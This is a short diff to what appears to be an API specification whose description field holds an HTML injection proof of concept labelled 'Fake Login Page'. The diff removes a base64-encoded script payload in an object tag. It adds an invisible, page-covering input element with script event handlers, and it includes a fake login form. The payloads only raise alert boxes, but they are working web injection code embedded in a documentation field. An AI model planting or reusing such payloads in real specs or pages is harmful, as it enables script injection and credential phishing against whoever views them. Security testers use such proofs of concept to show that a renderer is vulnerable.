@@ -4,7 +4,7 @@ info:
   title: Fake Login Page
   description: '<div class="login-form">
     <div class="heading">
-        <h1>HTML Injection : Fake Login</h1> (PoC d0ug.) <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnZDB1ZycpPC9zY3JpcHQ=%2b\"> <img src=x>
+        <h1>HTML Injection : Fake Login</h1> (PoC d0ug) <h1>Click here</h1> <input type=search value=x onsearch=alert('onsearch') oninput=alert('oninput') style=position:fixed;left:50%;top:50%;padding:0;width:10px;z-index:99;transform:scale(9999);opacity:0>
     </div>
     <div class="form-container">
         <form action="https://example.com/login" method="post" class="form-signin">
